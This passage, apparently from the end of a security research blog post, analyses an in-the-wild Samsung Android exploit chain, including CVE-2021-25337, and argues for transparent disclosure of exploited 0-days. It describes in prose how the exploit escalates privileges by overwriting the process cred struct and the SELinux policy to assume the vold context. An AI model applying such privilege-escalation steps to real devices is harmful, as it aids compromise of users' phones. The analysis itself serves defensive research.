The exploit now has arbitrary kernel read and write. It then follows the steps as seen in most other Android exploits: overwrite the cred struct for the current process and overwrite the loaded SELinux policy to change the current process’s context to vold. vold is the “Volume Daemon” which is responsible for mounting and unmounting of external storage. vold runs as root and while it's a userspace service, it’s considered kernel-equivalent as described in the [Android documentation on security contexts](https://source.android.com/docs/security/overview/updates-resources#process_types). Because it’s a highly privileged security context, it makes a prime target for changing the SELinux context to.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/w640-h172/image5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png)

As stated at the beginning of this post, the sample obtained was discovered in the preparatory stages of the attack. Unfortunately, it did not include the final payload that would have been deployed with this exploit.

This in-the-wild exploit chain is a great example of different attack surfaces and “shape” than many of the Android exploits we’ve seen in the past. All three vulnerabilities in this chain were in the manufacturer’s custom components rather than in the AOSP platform or the Linux kernel. It’s also interesting to note that 2 out of the 3 vulnerabilities were logic and design vulnerabilities rather than memory safety. Of the [10 other Android in-the-wild 0-days](https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1190662839) that we’ve tracked since mid-2014, only 2 of those were not memory corruption vulnerabilities.

The first vulnerability in this chain, the arbitrary file read and write, CVE-2021-25337, was the foundation of this chain, used 4 different times and used at least once in each step. The vulnerability was in the Java code of a custom content provider in the system_server. The Java components in Android devices don’t tend to be the most popular targets for security researchers despite it running at such a privileged level. This highlights an area for further research.

Labeling when vulnerabilities are known to be exploited in-the-wild is important both for targeted users and for the security industry. When in-the-wild 0-days are not transparently disclosed, we are not able to use that information to further protect users, using patch analysis and variant analysis, to gain an understanding of what attackers already know. 

The analysis of this exploit chain has provided us with new and important insights into how attackers are targeting Android devices. It highlights a need for more research into manufacturer specific components. It shows where we ought to do further variant analysis. It is a good example of how Android exploits can take many different “shapes” and so brainstorming different detection ideas is a worthwhile exercise. But in this case, we’re at least 18 months behind the attackers: they already know which bugs they’re exploiting and so when this information is not shared transparently, it leaves defenders at a further disadvantage. 

This transparent disclosure of in-the-wild status is necessary for both the safety and autonomy of targeted users to protect themselves as well as the security industry to work together to best prevent these 0-days in the future.